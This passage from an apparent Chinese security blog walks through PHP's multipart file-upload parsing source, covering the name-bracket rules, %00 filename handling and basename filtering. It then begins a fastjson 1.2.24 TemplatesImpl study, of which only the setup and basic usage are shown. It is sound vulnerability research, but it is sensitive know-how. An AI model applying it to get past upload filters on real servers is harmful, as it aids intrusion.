HTML标准协议，该协议在html基础上为input元素的type属性增加了一个file选项，同时限定了Form的method必须为POST，ENCTYPE必须为multipart&#x2F;form-data</p></blockquote><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>主体程序SAPI_POST_HANDLER_FUNC方法，主体前面是初始化，声明一些变量和相关函数</p><p><img src="/posts/9fa41563/php-3.png" title="主体函数"></p><h2 id="获取boundary"><a href="#获取boundary" class="headerlink" title="获取boundary"></a>获取boundary</h2><p>后面开始先获取boundary值</p><p><img src="/posts/9fa41563/php-4.png" title="主体函数"></p><p>获取过程中对boundary进行合法性校验</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断boundary中是否存在=号</span></span><br><span class="line"><span class="keyword">if</span> (!boundary || !(boundary = <span class="built_in">strchr</span>(boundary, <span class="string">&#x27;=&#x27;</span>))) &#123;</span><br><span class="line">sapi_module.sapi_error(E_WARNING, <span class="string">&quot;Missing boundary in multipart/form-data POST data&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boundary++;</span><br><span class="line">boundary_len = (<span class="type">int</span>)<span class="built_in">strlen</span>(boundary);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断boundary是否以&quot;开头,以&quot;结尾，判断为不合法</span></span><br><span class="line">  <span class="keyword">if</span> (boundary[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">boundary++;</span><br><span class="line">boundary_end = <span class="built_in">strchr</span>(boundary, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!boundary_end) &#123;</span><br><span class="line">sapi_module.sapi_error(E_WARNING, <span class="string">&quot;Invalid boundary in multipart/form-data POST data&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* search for the end of the boundary */</span></span><br><span class="line">boundary_end = <span class="built_in">strpbrk</span>(boundary, <span class="string">&quot;,;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>boundary获取后，对buffer流进行初始化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Initialize the buffer */</span></span><br><span class="line"><span class="keyword">if</span> (!(mbuff = <span class="title function_ invoke__">multipart_buffer_new</span>(boundary, boundary_len))) &#123;</span><br><span class="line">sapi_module.<span class="title function_ invoke__">sapi_error</span>(E_WARNING, <span class="string">&quot;Unable to initialize the input buffer&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来也是一些初始化工作</p><p><img src="/posts/9fa41563/php-5.png" title="初始化"></p><h2 id="解析Content-Disposition"><a href="#解析Content-Disposition" class="headerlink" title="解析Content-Disposition"></a>解析Content-Disposition</h2><p>接下来就是解析multipart&#x2F;form-data内容字段</p><p><img src="/posts/9fa41563/php-6.png" title="解析字段"></p><p>声明了一些变量过后，开始解析头部数据</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">multipart_buffer_headers</span>(mbuff, &amp;header)) &#123;</span><br><span class="line"><span class="keyword">goto</span> fileupload_done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取Content-Disposition字段</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((cd = php_mime_get_hdr_value(header, <span class="string">&quot;Content-Disposition&quot;</span>))) &#123;</span><br></pre></td></tr></table></figure><p>通过getword方法用”;”分割Content-Disposition字段值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (*cd &amp;&amp; (pair = <span class="title function_ invoke__">getword</span>(mbuff-&gt;input_encoding, &amp;cd, <span class="string">&#x27;;&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">char *key = <span class="literal">NULL</span>, *word = pair;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">isspace</span>(*cd)) &#123;</span><br><span class="line">++cd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在键值对后,再通过getword方法用”&#x3D;”分割键值对获取key名，然后判断Key值为”name”还是”filename”</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(<span class="built_in">pair</span>, <span class="string">&#x27;=&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">//通过getword方法获取=前面的key值</span></span><br><span class="line">      key = getword(mbuff-&gt;input_encoding, &amp;<span class="built_in">pair</span>, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//key为name的情况</span></span><br><span class="line">      <span class="keyword">if</span> (!strcasecmp(key, <span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (param) &#123;</span><br><span class="line">efree(param);</span><br><span class="line">&#125;</span><br><span class="line">param = getword_conf(mbuff-&gt;input_encoding, <span class="built_in">pair</span>);</span><br><span class="line"><span class="keyword">if</span> (mbuff-&gt;input_encoding &amp;&amp; internal_encoding) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *new_param;</span><br><span class="line"><span class="type">size_t</span> new_param_len;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>)<span class="number">-1</span> != zend_multibyte_encoding_converter(&amp;new_param, &amp;new_param_len, (<span class="type">unsigned</span> <span class="type">char</span> *)param, <span class="built_in">strlen</span>(param), internal_encoding, mbuff-&gt;input_encoding)) &#123;</span><br><span class="line">efree(param);</span><br><span class="line">param = (<span class="type">char</span> *)new_param;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//key为filename的情况</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(key, <span class="string">&quot;filename&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (filename) &#123;</span><br><span class="line">efree(filename);</span><br><span class="line">&#125;</span><br><span class="line">filename = getword_conf(mbuff-&gt;input_encoding, <span class="built_in">pair</span>);</span><br><span class="line"><span class="keyword">if</span> (mbuff-&gt;input_encoding &amp;&amp; internal_encoding) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *new_filename;</span><br><span class="line"><span class="type">size_t</span> new_filename_len;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>)<span class="number">-1</span> != zend_multibyte_encoding_converter(&amp;new_filename, &amp;new_filename_len, (<span class="type">unsigned</span> <span class="type">char</span> *)filename, <span class="built_in">strlen</span>(filename), internal_encoding, mbuff-&gt;input_encoding)) &#123;</span><br><span class="line">efree(filename);</span><br><span class="line">filename = (<span class="type">char</span> *)new_filename;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面主要涉及两个方法：getword、getword_conf</p><p><img src="/posts/9fa41563/php-7.png" title="getword"></p><p>getword:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">php_ap_getword</span><span class="params">(<span class="type">const</span> zend_encoding *encoding, <span class="type">char</span> **line, <span class="type">char</span> stop)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *pos = *line, quote;</span><br><span class="line"><span class="type">char</span> *res;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//读取词条，指针存在并且不只想结结束符号即进入循环</span></span><br><span class="line">  <span class="keyword">while</span> (*pos &amp;&amp; *pos != stop) &#123;</span><br><span class="line">    <span class="comment">//读取到&quot;或者&#x27;的位置，获取符号后面的数据</span></span><br><span class="line"><span class="keyword">if</span> ((quote = *pos) == <span class="string">&#x27;&quot;&#x27;</span> || quote == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">++pos;</span><br><span class="line"><span class="keyword">while</span> (*pos &amp;&amp; *pos != quote) &#123;</span><br><span class="line">        <span class="comment">//如果获取符号中存在\+quote，会跳过\符号，取quote值，比如&quot;test\&quot;,就会忽略掉\符号得到&quot;test&quot;</span></span><br><span class="line"><span class="keyword">if</span> (*pos == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; pos[<span class="number">1</span>] &amp;&amp; pos[<span class="number">1</span>] == quote) &#123;</span><br><span class="line">pos += <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">++pos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (*pos) &#123;</span><br><span class="line">++pos;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> ++pos;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (*pos == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">res = estrdup(*line);</span><br><span class="line">*line += <span class="built_in">strlen</span>(*line);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = estrndup(*line, pos - *line);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*pos == stop) &#123;</span><br><span class="line">++pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*line = pos;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getword_conf:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">php_ap_getword_conf</span><span class="params">(<span class="type">const</span> zend_encoding *encoding, <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//判断当前str指针是否存在且是否为空</span></span><br><span class="line">  <span class="keyword">while</span> (*str &amp;&amp; <span class="built_in">isspace</span>(*str)) &#123;</span><br><span class="line">++str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果str指针索引循环完不存在的话，表示空，指向&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (!*str) &#123;</span><br><span class="line"><span class="keyword">return</span> estrdup(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//索引到以&quot;或者&#x27;的时候，调用substring_conf方法开始从&quot;或者&#x27;字符的后一位开始选取</span></span><br><span class="line">  <span class="keyword">if</span> (*str == <span class="string">&#x27;&quot;&#x27;</span> || *str == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line"><span class="type">char</span> quote = *str;</span><br><span class="line"></span><br><span class="line">str++;</span><br><span class="line"><span class="keyword">return</span> substring_conf(str, (<span class="type">int</span>)<span class="built_in">strlen</span>(str), quote);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">char</span> *strend = str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*strend &amp;&amp; !<span class="built_in">isspace</span>(*strend)) &#123;</span><br><span class="line">++strend;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> substring_conf(str, strend - str, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">substring_conf</span><span class="params">(<span class="type">char</span> *start, <span class="type">int</span> len, <span class="type">char</span> quote)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *result = emalloc(len + <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> *resp = result;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len &amp;&amp; start[i] != quote; ++i) &#123;</span><br><span class="line">    <span class="comment">//判断字符中存在\\或者\&#x27; \&quot;的情况，进行跳过</span></span><br><span class="line"><span class="keyword">if</span> (start[i] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; (start[i + <span class="number">1</span>] == <span class="string">&#x27;\\&#x27;</span> || (quote &amp;&amp; start[i + <span class="number">1</span>] == quote))) &#123;</span><br><span class="line">*resp++ = start[++i];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*resp++ = start[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*resp = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="上传文件限制判断"><a href="#上传文件限制判断" class="headerlink" title="上传文件限制判断"></a>上传文件限制判断</h2><p>继续回到主体中，获取了filename或者name后，接下来对上传主体进行默认的php上传限制判断</p><p><img src="/posts/9fa41563/php-9.png" title="限制判断"></p><p>经过php的默认上传限制判断后，再查看用户提交参数中是否存在MAX_FILE_SIZE字段，即用户定义的上传大小上限，通过自定义大小判断用户上传文件是否超过大小，因此MAX_FILE_SIZE并不能超过PHP中设置的最大上传文件大小。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!strcasecmp(param, <span class="string">&quot;MAX_FILE_SIZE&quot;</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_ATOLL</span></span><br><span class="line">max_file_size = atoll(value);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">max_file_size = strtoll(value, <span class="literal">NULL</span>, <span class="number">10</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">efree(param);</span><br><span class="line">efree(value);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断完大小后，再判断是否进行文件上传<br><img src="/posts/9fa41563/php-10.png" title="是否文件上传"></p><p>如果是文件上传，会进行一个判断，判断param参数（即name参数）</p><ul><li>当name值只存在]字符，即skip_upload &#x3D; 1成立，会忽略上传的文件，如：name]</li><li>当name值只存在[字符，即skip_upload &#x3D; 1成立，会忽略上传的文件，如：name[</li><li>当name值存在[]两个字符，且[位于字段开头位置，c值为0，但实际测试过程还是会上传失败，如：[name]</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* New Rule: never repair potential malicious user input */</span></span><br><span class="line"><span class="keyword">if</span> (!skip_upload) &#123;</span><br><span class="line"><span class="type">long</span> c = <span class="number">0</span>;</span><br><span class="line">tmp = param;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (*tmp) &#123;</span><br><span class="line"><span class="keyword">if</span> (*tmp == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">c++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (*tmp == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">c--;</span><br><span class="line"><span class="keyword">if</span> (tmp[<span class="number">1</span>] &amp;&amp; tmp[<span class="number">1</span>] != <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">skip_upload = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">skip_upload = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Brackets should always be closed */</span></span><br><span class="line"><span class="keyword">if</span>(c != <span class="number">0</span>) &#123;</span><br><span class="line">skip_upload = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parm来源，为获取参数name的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//parm来源</span></span><br><span class="line">     <span class="keyword">if</span> (!strcasecmp(key, <span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (param) &#123;</span><br><span class="line">efree(param);</span><br><span class="line">&#125;</span><br><span class="line">param = getword_conf(mbuff-&gt;input_encoding, <span class="built_in">pair</span>);</span><br></pre></td></tr></table></figure><p>上传失败：</p><p><img src="/posts/9fa41563/php-11.png" title="上传失败"></p><p>后面对文件名的判断,判断文件名是否开头为结尾符号（’\0’表示代码结尾）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG_FILE_UPLOAD</span></span><br><span class="line">sapi_module.sapi_error(E_NOTICE, <span class="string">&quot;No file uploaded&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">cancel_upload = UPLOAD_ERROR_D;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/9fa41563/php-12.png" title="filename开头判断"></p><p>将%00进行Url编码后上传，即出现错误</p><p><img src="/posts/9fa41563/php-13.png" title="filename开头判断"></p><h2 id="临时文件创建"><a href="#临时文件创建" class="headerlink" title="临时文件创建"></a>临时文件创建</h2><p>文件正常上传判断后，通过<code>php_open_temporary_fd_ex</code>方法创建临时文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">fd = php_open_temporary_fd_ex(PG(upload_tmp_dir), <span class="string">&quot;php&quot;</span>, &amp;temp_filename, </span><br><span class="line">PHP_TMP_FILE_OPEN_BASEDIR_CHECK_ON_FALLBACK);</span><br><span class="line">upload_cnt--;</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">sapi_module.sapi_error(E_WARNING, <span class="string">&quot;File upload error - unable to create a temporary file&quot;</span>);cancel_upload = UPLOAD_ERROR_E;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>php_open_temporary_fd_ex</code>方法中再通过调用<code>php_do_open_temporary_file</code>方法进行创建文件，最后返回随机临时文件名</p><p><img src="/posts/9fa41563/php-14.png" title="临时文件创建"></p><p>文件名路径会根据php环境选取对应的默认临时路径</p><p><img src="/posts/9fa41563/php-16.png" title="临时文件创建"></p><p>临时文件名格式为<code>php</code>+<code>随机字符</code>+<code>.tmp</code>结尾</p><p><img src="/posts/9fa41563/php-15.png" title="临时文件创建"></p><p>经过文件名、大小的判断过后通过<code>write</code>方法将文件写入临时文件</p><p><img src="/posts/9fa41563/php-17.png" title="临时文件创建"></p><p>然后通过<code>zend_string_release_ex</code>方法对临时文件进行释放（我理解为关闭释放掉临时文件写入的进程管道）</p><p><img src="/posts/9fa41563/php-18.png" title="临时文件释放"></p><p>对parm参数的数组情况进行对应处理后，进入对filename的安全过滤处理</p><h2 id="filename安全过滤"><a href="#filename安全过滤" class="headerlink" title="filename安全过滤"></a>filename安全过滤</h2><p>有一段注释描述在windows环境下由于特殊符号对路径的影响，所以对filename进行了一些安全处理</p><p>通过php_ap_basename方法对filename进行安全过滤</p><p><img src="/posts/9fa41563/php-19.png" title="安全过滤"></p><p>下列代码对filename进行\或者&#x2F;进行匹配，匹配到的话，就获取最后一个斜线后的内容，前面的内容进行跳过</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">php_ap_basename</span><span class="params">(<span class="type">const</span> zend_encoding *encoding, <span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *s = <span class="built_in">strrchr</span>(path, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"><span class="type">char</span> *s2 = <span class="built_in">strrchr</span>(path, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s &amp;&amp; s2) &#123;</span><br><span class="line"><span class="keyword">if</span> (s &gt; s2) &#123;</span><br><span class="line">++s;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">s = ++s2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (s) &#123;</span><br><span class="line"><span class="keyword">return</span> ++s;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (s2) &#123;</span><br><span class="line"><span class="keyword">return</span> ++s2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="/posts/9fa41563/php-20.png" title="安全过滤"><br><img src="/posts/9fa41563/php-21.png" title="安全过滤"></p><p>最后后面的就是针对各个参数生成$_FILES内容，没有了其它的过滤。</p><h1 id="0x03、调试分析"><a href="#0x03、调试分析" class="headerlink" title="0x03、调试分析"></a>0x03、调试分析</h1><p>主机原因先缺着，后面再补</p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>在没有找到分析文章前，看着是真的费力，理解上很容易跑偏，学习他们的分析文章再看，可能过程中也有理解错的地方，总体也只是对rfc1867协议的部分内容进行浅析，协议的完整处理过程还是理解不全。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://www.laruence.com/2009/09/26/1103.html">https://www.laruence.com/2009/09/26/1103.html</a><br><a href="https://blog.csdn.net/gnaw0725/article/details/45869847">https://blog.csdn.net/gnaw0725/article/details/45869847</a><br><a href="https://xz.aliyun.com/t/11486#toc-10">https://xz.aliyun.com/t/11486#toc-10</a></p>]]></content>
      
      
      <categories>
          
          <category> php安全 </category>
          
          <category> php内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php安全 </tag>
            
            <tag> php内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-fastjson及其TemplatesImpl链学习与分析</title>
      <link href="/posts/ad3be047.html"/>
      <url>/posts/ad3be047.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>本文学习fastjson以及在1.2.24版本下的TemplatesImpl链利用，学习下分析思路，尽量理解漏洞在源码上的触发过程。</p><h1 id="0x01、fastjson描述"><a href="#0x01、fastjson描述" class="headerlink" title="0x01、fastjson描述"></a>0x01、fastjson描述</h1><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。<br>官方地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a><br>官方中文地址：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p><p>优点：</p><ul><li>性能速度快</li><li>使用广泛</li><li>测试完备（虽然现在各版本爆出来的问题有点多）</li><li>使用简单</li><li>功能完备</li></ul><p>格式跟jackson很像，区别jackson数据要求比较严格，其中提交的数据只能为对应Javabean的key，不能添加多余不在javabean的key进行提交，因此会报错，而fastjson不会</p><p>新建maven项目，然后环境添加：<br>直接添加对应版本到maven依赖即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-1.png" title="添加依赖"></p><h1 id="0x02、fastjson简单使用"><a href="#0x02、fastjson简单使用" class="headerlink" title="0x02、fastjson简单使用"></a>0x02、fastjson简单使用</h1><p>主要学习序列化和反序列化接口<br>简单使用：<br>创建基础实例类People类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">People</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用People类构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="序列化-toJSONString"><a href="#序列化-toJSONString" class="headerlink" title="序列化-toJSONString()"></a>序列化-toJSONString()</h2><p>还有一些其它的序列化方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，支持各种各种Java基本类型和JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJSONString</span><span class="params">(Object object, SerializerFeature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，返回JSON字符串的utf-8 bytes</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toJSONBytes(Object object, SerializerFeature... features);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，写入到Writer中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeJSONString</span><span class="params">(Writer writer, </span></span><br><span class="line"><span class="params">                                   Object object, </span></span><br><span class="line"><span class="params">                                   SerializerFeature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将Java对象序列化为JSON字符串，按UTF-8编码写入到OutputStream中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">writeJSONString</span><span class="params">(OutputStream os,</span></span><br><span class="line"><span class="params">                                        Object object,</span></span><br><span class="line"><span class="params">                                        SerializerFeature... features)</span>;</span><br></pre></td></tr></table></figure><p>序列化toJSONString()的使用：<br><code>JSON.toJSONString(Class class)</code><br><code>JSON.toJSONString(Class class,SerializerFeature ...)</code>可以使用SerializerFeature.WriteClassName参数将类名加到序列化json字段的@type中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        People people=<span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">        people.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        Object fj=JSON.toJSONString(people);</span><br><span class="line">        System.out.println(fj);</span><br><span class="line">        Object fj2=JSON.toJSONString(people, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(fj2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-2.png" title="toJSONString()的使用"></p><h2 id="反序列化-parseObject-、parse-、parseArray"><a href="#反序列化-parseObject-、parse-、parseArray" class="headerlink" title="反序列化-parseObject()、parse()、parseArray()"></a>反序列化-parseObject()、parse()、parseArray()</h2><p>还有一些其他不同参数的使用方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将JSON字符串反序列化为JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(String jsonStr, </span></span><br><span class="line"><span class="params">                                Class&lt;T&gt; clazz, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列化为JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(<span class="type">byte</span>[] jsonBytes,  // UTF-<span class="number">8</span>格式的JSON字符串</span></span><br><span class="line"><span class="params">                                Class&lt;T&gt; clazz, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列化为泛型类型的JavaBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(String text, </span></span><br><span class="line"><span class="params">                                TypeReference&lt;T&gt; type, </span></span><br><span class="line"><span class="params">                                Feature... features)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串反序列为JSONObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span>;</span><br></pre></td></tr></table></figure><p>反序列化parseObject()、parse()用法<br><code>JSON.parseObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 